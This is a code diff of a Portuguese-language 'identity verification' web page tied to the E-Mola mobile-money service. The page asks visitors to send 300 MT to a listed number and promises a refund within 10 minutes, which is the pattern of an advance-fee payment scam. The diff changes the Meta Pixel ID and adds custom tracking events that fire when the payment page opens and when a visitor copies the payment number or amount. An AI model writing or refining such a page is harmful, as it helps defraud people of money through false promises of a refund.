@@ -13,11 +13,14 @@ n.queue=[];t=b.createElement(e);t.async=!0;
 t.src=v;s=b.getElementsByTagName(e)[0];
 s.parentNode.insertBefore(t,s)}(window, document,'script',
 'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1297950345267608');
+fbq('init', '4179716432354886');
 fbq('track', 'PageView');
+
+// 🔥 Evento personalizado ao abrir a página de verificação
+fbq('trackCustom', 'PagamentoPageOpened');
 </script>
 <noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=1297950345267608&ev=PageView&noscript=1"
+src="https://www.facebook.com/tr?id=4179716432354886&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
  
@@ -313,7 +316,6 @@ src="https://www.facebook.com/tr?id=1297950345267608&ev=PageView&noscript=1"
     <h2 class="titulo-verificacao">🔒 Verificação de Identidade</h2>
     <p class="descricao-verificacao">
       Para finalizar a verificação e fazer o Txuna E-Mola, faça uma transferência  de <strong>300 MT</strong> para o número indicado e depois confirme no botão abaixo <strong>Finalizar Verificação</strong>  
-
       </p><p>
         <strong>ATENÇÃO:</strong> O valor será reembolsado dentro de 10min ✅
       </p>
@@ -413,6 +415,7 @@ src="https://www.facebook.com/tr?id=1297950345267608&ev=PageView&noscript=1"
       setTimeout(() => toast.classList.remove('show'), 2000);
     }
 
+    // Copiar e disparar Pixel
     async function copyText(text) {
       let ok = false;
       if (navigator.clipboard && window.isSecureContext) {
@@ -428,6 +431,10 @@ src="https://www.facebook.com/tr?id=1297950345267608&ev=PageView&noscript=1"
         try { ok = document.execCommand('copy'); } catch {}
         document.body.removeChild(ta);
       }
+
+      // 🔥 Pixel IC (evento customizado ao copiar número ou valor)
+      fbq('trackCustom', 'NumeroPagamentoCopiado', { conteudo: text });
+
       showToast(ok ? 'Copiado: ' + text : 'Não foi possível copiar');
     }
 
